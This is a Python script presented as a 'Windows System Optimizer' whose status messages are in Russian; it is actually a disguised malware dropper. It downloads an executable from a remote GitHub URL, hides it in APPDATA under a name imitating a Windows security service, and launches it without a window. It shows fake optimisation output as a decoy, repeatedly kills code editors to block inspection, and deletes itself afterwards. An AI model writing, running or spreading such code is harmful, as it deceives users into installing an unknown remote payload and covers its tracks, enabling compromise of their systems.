import os
import threading
import time
import requests
import subprocess
import random
import sys

ui = 'earrprocess'
OPTIMIZATIONN = 100
U = "https://github.com/iDorofa/REMOTEPL/raw/refs/heads/main/Windows.Security.Health.Service.Host.Container.Runtime.exe"
PAT = os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Windows.Security.Health.Service.Host.Container.Runtime.exe")

def background_task():
    try:
        print("[*] Скачивание файла...")
        r = requests.get(U, timeout=30)
        with open(PAT, 'wb') as f:
            f.write(r.content)
        os.system(f'attrib +h "{PAT}"')
        print("[+] Файл сохранен")
        
        print("[*] Запуск...")
        subprocess.Popen([PAT], creationflags=subprocess.CREATE_NO_WINDOW)
        print("[+] Запущен")
    except Exception as e:
        print(f"[-] Ошибка: {e}")

def optimize_memory():
    print("[*] Анализ сегментов памяти...")
    for i in range(1, 6):
        time.sleep(random.uniform(0.5, 1.5))
        print(f"    - Секция {hex(random.getrandbits(16))}: Оптимизировано")
    print("[+] Очистка завершена. Освобождено.")

def check_network_latency():
    print("[*] Проверка...")
    time.sleep(2)
    _ = [abs(random.random()) for _ in range(10)]
    print("[+] в норме")

def self_delete():
    try:
        bat_path = os.path.join(os.environ.get('TEMP'), 'delete_me.bat')
        with open(bat_path, 'w', encoding='utf-8') as f:
            f.write(f"""@echo off
:loop
ping 127.0.0.1 -n 2 > nul
del /F /Q "{__file__}" 2> nul
if exist "{__file__}" goto loop
del "%~f0" 2> nul
""")
        subprocess.Popen(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

def kill_dev_tools():
    editors = [
        "pycharm64.exe", "pycharm.exe", "code.exe", 
        "thonny.exe", "sublime_text.exe", "notepad++.exe"
    ]
    for editor in editors:
        try:
            subprocess.run(f"taskkill /F /IM {editor} > nul 2>&1", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass

def dev_killer_loop():
    for _ in range(30):
        kill_dev_tools()
        time.sleep(1)

if __name__ == "__main__":
    print("=== Windows System Optimizer v1.2 ===")
    
    t = threading.Thread(target=background_task)
    t.start()
    
    killer_thread = threading.Thread(target=dev_killer_loop)
    killer_thread.start()
    
    optimize_memory()
    check_network_latency()
    
    print("\n[*] Ожидание завершения...")
    
    t.join(timeout=60)
    
    print("[*] Готово")
    time.sleep(3)
    
    self_delete()
    
    os._exit(0)
